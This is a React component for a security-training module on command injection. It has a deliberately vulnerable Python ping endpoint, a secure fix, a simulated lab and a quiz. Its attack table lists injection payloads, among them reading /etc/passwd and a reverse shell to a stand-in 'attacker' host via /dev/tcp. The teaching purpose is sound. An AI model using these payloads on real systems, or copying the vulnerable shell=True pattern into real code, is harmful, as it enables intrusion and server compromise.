import React, { useState } from 'react';
import { AlertCircle, BookOpen, CheckCircle, Code, Code2, Home, Shield, Terminal, Trophy } from 'lucide-react';
import PythonCode from '../../components/PythonCode';
import Quiz from '../../components/Quiz';

const CommandInjectionModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const vulnerableCode = `from fastapi import FastAPI
import subprocess

app = FastAPI()

@app.get("/ping")
async def ping_host(host: str):
    """⚠️ VULNERABLE - Shell command built from user input"""
    # DANGEROUS: shell=True plus string interpolation lets attackers
    # append their own commands using ; | & or backticks
    command = f"ping -c 4 {host}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return {"output": result.stdout}`;

  const secureCode = `from fastapi import FastAPI, HTTPException
import subprocess
import re

app = FastAPI()
HOSTNAME_PATTERN = re.compile(r'^[a-zA-Z0-9.-]+$')

@app.get("/ping")
async def ping_host(host: str):
    """✅ SECURE - Validates input and avoids the shell entirely"""
    # SAFE: allowlist validation - only letters, digits, dots, hyphens
    if not HOSTNAME_PATTERN.match(host) or len(host) > 253:
        raise HTTPException(400, "Invalid hostname")

    # SAFE: argument list passed directly to the OS - no shell involved,
    # so metacharacters like ; | & \`  $() are just literal text
    result = subprocess.run(
        ["ping", "-c", "4", host],
        shell=False,
        capture_output=True,
        text=True,
        timeout=10
    )
    return {"output": result.stdout}`;

  const comparisonCode = `from fastapi import FastAPI, HTTPException
import subprocess
import re

app = FastAPI()
HOSTNAME_PATTERN = re.compile(r'^[a-zA-Z0-9.-]+$')

@app.get("/ping")
async def ping_host(host: str):
    """✅ SECURE - Validates input and avoids the shell entirely"""

    # ✅ NEW (SECURE): allowlist the expected shape of a hostname
    if not HOSTNAME_PATTERN.match(host) or len(host) > 253:
        raise HTTPException(400, "Invalid hostname")

    # ❌ OLD (VULNERABLE): shell=True + f-string interpolation
    # command = f"ping -c 4 {host}"
    # result = subprocess.run(command, shell=True, ...)

    # ✅ NEW (SECURE): argument list, no shell interpretation at all
    result = subprocess.run(
        ["ping", "-c", "4", host], shell=False, capture_output=True, text=True, timeout=10
    )
    return {"output": result.stdout}`;

  const quizQuestions = [
    {
      id: 1,
      question: "Why does `shell=True` combined with an f-string cause command injection?",
      options: [
        "It doesn't - shell=True is always safe",
        "The whole string is handed to a shell interpreter, which treats characters like ; | & as command separators/operators",
        "It only affects Windows systems",
        "It slows down the request too much to exploit"
      ],
      correct: 1,
      explanation: "With shell=True, the OS shell parses the entire string, so metacharacters embedded in user input are interpreted as shell syntax rather than literal text."
    },
    {
      id: 2,
      question: "What's the safest fix when you must run an external command with Python's subprocess module?",
      options: [
        "Escape every special character manually before building the string",
        "Pass an argument list with shell=False so the OS executes the program directly, with no shell to interpret metacharacters",
        "Use os.system() instead of subprocess",
        "Base64-encode the user input before including it in the command"
      ],
      correct: 1,
      explanation: "Passing a list of arguments with shell=False bypasses the shell entirely - the OS receives the program name and arguments directly, so characters like ; | & have no special meaning."
    },
    {
      id: 3,
      question: "Besides avoiding the shell, what else helps limit damage from command injection?",
      options: [
        "Nothing else is needed once shell=True is removed",
        "Allowlist input validation, running with least-privilege, and setting execution timeouts",
        "Increasing the server's RAM",
        "Disabling HTTPS"
      ],
      correct: 1,
      explanation: "Defense in depth matters: validating input format, running the process with minimal OS permissions, and bounding execution time all reduce the blast radius if something is still missed."
    },
    {
      id: 4,
      question: "What can a successful command injection attack achieve?",
      options: [
        "Only reading the ping output faster",
        "Arbitrary code execution on the server, potentially leading to full system compromise",
        "Improving network latency",
        "Nothing beyond a denial of service"
      ],
      correct: 1,
      explanation: "Command injection lets an attacker run any command the server's process is permitted to run - from reading files to installing a reverse shell for persistent access."
    }
  ];

  const mockExec = (host) => {
    const dangerousChars = /[;&|`$()<>\n]/;
    if (dangerousChars.test(host)) {
      let leak = null;
      if (host.includes('passwd') || host.toLowerCase().includes('cat')) {
        leak = 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash';
      } else if (host.toLowerCase().includes('whoami')) {
        leak = 'www-data';
      } else if (host.toLowerCase().includes('curl') || host.toLowerCase().includes('bash')) {
        leak = '[simulated] outbound connection attempted to attacker-controlled host';
      }
      return {
        safe: false,
        message: "⚠️ Command Injection Detected!",
        impact: "The shell interpreted the metacharacter in your input as a command separator/operator and executed a second command alongside (or instead of) the intended ping.",
        leak
      };
    }
    return { safe: true, message: `✅ PING ${host}: 4 packets transmitted, 4 received, 0% packet loss`, leak: null };
  };

  const handleLabSubmit = () => {
    const result = mockExec(labInput);
    setLabResult(result);
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        <button onClick={onBack} className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all">
          <Home className="w-5 h-5" /> Back to Modules
        </button>

        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Code2 className="w-10 h-10 text-red-400" />
            <h1 className="text-4xl font-bold">Command Injection</h1>
          </div>
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500" style={{ width: `${progressPercent}%` }} />
            </div>
          </div>
        </div>

        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg' : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && <CheckCircle className="w-4 h-4 text-green-400" />}
            </button>
          ))}
        </div>

        {activeTab === 'learn' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              <p className="text-slate-300 mb-4">
                Command injection occurs when an application passes user input to a system shell without proper isolation. If the input
                is concatenated into a shell command string, an attacker can append their own commands using shell metacharacters.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Malicious Input</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Command Chaining</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">google.com; cat /etc/passwd</code></td>
                        <td className="p-2 text-slate-300">Runs a second arbitrary command after ping</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Piping</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">google.com | whoami</code></td>
                        <td className="p-2 text-slate-300">Reveals the server's running user</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Command Substitution</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">google.com $(whoami)</code></td>
                        <td className="p-2 text-slate-300">Executes inline substitution before ping runs</td>
                      </tr>
                      <tr>
                        <td className="p-2 font-semibold text-red-400">Reverse Shell</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">google.com; bash -i {'>&'} /dev/tcp/attacker/4444</code></td>
                        <td className="p-2 text-slate-300">Grants a full remote interactive shell</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">💥 Full Server Compromise</h4>
                  <p className="text-sm text-slate-300">Arbitrary commands run with the web application's OS privileges</p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">📤 Data Exfiltration</h4>
                  <p className="text-sm text-slate-300">Files, credentials, and database dumps sent to attacker servers</p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">🕳️ Persistent Access</h4>
                  <p className="text-sm text-slate-300">Reverse shells or backdoors installed for long-term access</p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">🌐 Lateral Movement</h4>
                  <p className="text-sm text-slate-300">Compromised server used as a pivot into the internal network</p>
                </div>
              </div>
            </div>

            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>
              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button onClick={() => setCodeView('comparison')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'comparison' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Before/After Comparison</button>
                <button onClick={() => setCodeView('sidebyside')} className={`flex-1 px-4 py-2 rounded-lg transition-all ${codeView === 'sidebyside' ? 'bg-green-600' : 'bg-slate-600 hover:bg-slate-500'}`}>Side-by-Side View</button>
              </div>
              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <PythonCode code={comparisonCode} />
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE:</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER:</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}
              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Command Injection Defense Checklist:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Avoid the Shell:</strong> Use subprocess with shell=False and an argument list</li>
                  <li>• <strong>Allowlist Input:</strong> Validate against a strict pattern (e.g., only hostname characters)</li>
                  <li>• <strong>Prefer Library APIs:</strong> Use language/library functions instead of shelling out when possible</li>
                  <li>• <strong>Least Privilege:</strong> Run the process as a low-privilege, sandboxed user</li>
                  <li>• <strong>Timeouts:</strong> Bound execution time to limit damage from runaway or malicious commands</li>
                </ul>
              </div>
            </div>

            <button onClick={() => { setActiveTab('lab'); onSectionComplete('learn'); }} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Lab: Ping Endpoint</h3>
              <p className="text-slate-300 mb-4">
                This simulates <code className="bg-slate-900 px-2 py-1 rounded">GET /ping?host=...</code> running against a vulnerable
                shell command. Try a normal hostname, then try chaining a second command.
              </p>
              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">host:</label>
                <div className="flex gap-3">
                  <input
                    type="text"
                    value={labInput}
                    onChange={(e) => setLabInput(e.target.value)}
                    placeholder="Try: google.com or google.com; cat /etc/passwd"
                    className="flex-1 bg-slate-800 border border-slate-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-purple-500"
                  />
                  <button onClick={handleLabSubmit} className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-bold">Ping</button>
                </div>
              </div>

              {labResult && (
                <div className={`mt-4 rounded-lg p-4 border ${labResult.safe ? 'bg-green-900/20 border-green-500/50' : 'bg-red-900/20 border-red-500/50'}`}>
                  <p className={`font-bold ${labResult.safe ? 'text-green-400' : 'text-red-400'}`}>{labResult.message}</p>
                  {labResult.impact && <p className="text-sm text-slate-300 mt-2">{labResult.impact}</p>}
                  {labResult.leak && <pre className="bg-slate-950 rounded p-3 mt-3 text-xs text-slate-300 overflow-x-auto whitespace-pre-wrap">{labResult.leak}</pre>}
                </div>
              )}

              <button onClick={() => { setActiveTab('quiz'); onSectionComplete('lab'); }} className="w-full mt-6 bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700">
                Ready for the Quiz? →
              </button>
            </div>
          </div>
        )}

        {activeTab === 'quiz' && (
          <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
            <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Trophy className="w-6 h-6 text-yellow-400" />
              Knowledge Check Quiz
            </h3>
            <Quiz questions={quizQuestions} onComplete={() => onSectionComplete('quiz')} />
          </div>
        )}
      </div>
    </div>
  );
};

export default CommandInjectionModule;
